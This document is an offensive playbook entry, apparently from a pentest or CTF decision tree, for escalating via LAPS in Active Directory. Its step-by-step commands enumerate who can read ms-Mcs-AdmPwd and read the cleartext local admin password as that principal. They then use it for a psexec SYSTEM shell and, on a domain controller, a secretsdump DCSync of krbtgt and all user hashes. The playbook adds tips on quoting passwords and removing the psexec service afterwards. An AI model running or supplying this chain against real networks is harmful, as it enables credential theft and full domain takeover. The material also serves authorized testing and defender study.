title: LAPS Reader Privesc — Read ms-Mcs-AdmPwd to Local Admin
body:
LAPS (Local Administrator Password Solution) randomizes and rotates each machine's local Administrator password, storing the cleartext in the computer object's ms-Mcs-AdmPwd attribute (legacy LAPS) or msLAPS-Password (Windows LAPS). The password is ACL'd — only specific principals can read it. THAT ACL is the attack surface.

THE TELL: you query the computer object and ms-Mcs-AdmPwd comes back BLANK while ms-Mcs-AdmPwdExpirationTime (the rotation timestamp) is readable. That split means LAPS is deployed and you simply lack read rights on the password — not that it's empty. Find who CAN read it and become them.

THE CHAIN:
  1. Confirm LAPS: expiration time readable, password blank.
  2. Enumerate the ACL on the computer object — who has ReadProperty / All-Extended-Rights on ms-Mcs-AdmPwd?
  3. Resolve those SIDs. Domain Admins (RID 512) is expected and useless to you. A custom user/group (RID 1100+) is the intended path — that's who you pivot to.
  4. Become that principal (spray, roast, ACL edge, looted cred — whatever gets you their creds).
  5. Read ms-Mcs-AdmPwd as them — this is pure LDAP, NO shell on the target needed.
  6. The value is the box's LOCAL Administrator password -> authenticate --local-auth.

If the target is a DOMAIN CONTROLLER, its local admin = SYSTEM on the DC = full domain compromise via DCSync. On a member server it's local admin on that host — still a strong pivot.

TOOLING NOTE: Get-LapsADPassword is the Windows-LAPS cmdlet and won't exist if that module isn't installed. For legacy LAPS (ms-Mcs-AdmPwd) just read the attribute directly via PowerView, nxc, or ldapsearch — no module required.
cmd:
# ════════════════════════════════════════════════════════════
# 1. CONFIRM LAPS — expiration readable, password blank = you lack read rights
# ════════════════════════════════════════════════════════════
# PowerView (from a Windows foothold):
Get-DomainComputer TARGETHOST -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
#   -> ms-mcs-admpwdexpirationtime shows, ms-mcs-admpwd is empty  ==> LAPS, no read rights yet

# ════════════════════════════════════════════════════════════
# 2. ENUMERATE the ACL on the computer object — who can READ the password
# ════════════════════════════════════════════════════════════
Get-DomainObjectAcl -Identity TARGETHOST -ResolveGUIDs |
  ? { $_.ObjectAceType -eq 'ms-Mcs-AdmPwd' } |
  Select SecurityIdentifier, ActiveDirectoryRights | Fl
#   look for ReadProperty / ExtendedRight

# 3. RESOLVE the SIDs:
ConvertFrom-SID S-1-5-21-...-1115
#   RID 512 = Domain Admins (expected, not your path)
#   RID 1100+ = a custom user/group = the INTENDED reader -> become this principal

# ════════════════════════════════════════════════════════════
# 4-5. READ the password AS the reader (pure LDAP — no shell on target required)
# ════════════════════════════════════════════════════════════
# nxc LAPS module (note: -M laps, NOT --laps, on current builds):
nxc ldap $ip -u READER -p 'READER_PW' -M laps
#   -> Computer:TARGETHOST$  User:  Password:<CLEARTEXT_LOCAL_ADMIN_PW>

# ldapsearch fallback (legacy attribute) if the module misbehaves:
ldapsearch -x -H ldap://$ip -D 'READER@DOMAIN.TLD' -w 'READER_PW' \
  -b 'dc=DOMAIN,dc=TLD' '(&(objectClass=computer)(cn=TARGETHOST))' \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime

# PowerView as the reader (build a PSCredential if your shell token isn't them):
$p=ConvertTo-SecureString 'READER_PW' -AsPlainText -Force
$c=New-Object System.Management.Automation.PSCredential('DOMAIN\READER',$p)
Get-DomainComputer TARGETHOST -Properties ms-mcs-admpwd -Credential $c

# ════════════════════════════════════════════════════════════
# 6. USE IT — LAPS = LOCAL Administrator, so authenticate --local-auth
# ════════════════════════════════════════════════════════════
nxc smb $ip -u administrator -p '<LAPS_PW>' --local-auth          # expect (Pwn3d!)
impacket-psexec administrator:'<LAPS_PW>'@$ip                     # SYSTEM shell

# If the target is a DC: SYSTEM there = domain. DCSync everything:
impacket-secretsdump -just-dc DOMAIN.TLD/administrator:'<LAPS_PW>'@$ip --local-auth
#   dumps krbtgt (Golden Ticket) + domain Administrator + all users
warn: STATUS_LOGON_FAILURE from one tool does NOT mean the LAPS password is wrong — nxc may default to a domain context; the password is a LOCAL account, so --local-auth is mandatory and impacket-psexec may succeed where nxc 'failed'. Watch shell-quoting on LAPS passwords (they contain & - ! and other shell metachars) — always single-quote them. And clean up the psexec service afterward (sc delete <name>).

choices.label: Got the LAPS password — psexec as local admin
Target is the DC — DCSync the domain
Need to BECOME the reader first (ACL edge)
Not sure who the reader is — map it in BloodHound
Reader's creds came from a description field
